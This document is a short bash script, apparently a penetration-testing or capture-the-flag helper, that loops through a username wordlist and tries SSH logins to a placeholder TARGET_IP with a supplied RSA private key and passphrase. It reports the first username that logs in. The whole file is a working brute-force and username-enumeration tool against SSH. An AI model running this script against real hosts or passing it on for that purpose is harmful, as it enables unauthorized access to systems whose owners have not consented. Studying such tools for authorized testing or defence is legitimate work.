#!/bin/bash

key_path="RSA_FILE_HERE"
host="TARGET_IP"
wordlist="USERNAME_LIST"
passphrase="RSA_FILE_PASS_HERE"

if [ ! -f "$wordlist" ]; then
    echo "Wordlist file not found!"
    exit 1
fi

while IFS= read -r username; do
    echo "Trying $username..."
    sshpass -p "$passphrase" ssh -i $key_path -o BatchMode=yes -o ConnectTimeout=5 $username@$host "exit"
    if [ $? -eq 0 ]; then
        echo "Success: Logged in as $username"
        exit 0
    fi
done < "$wordlist"

echo "Failed to find the correct username"
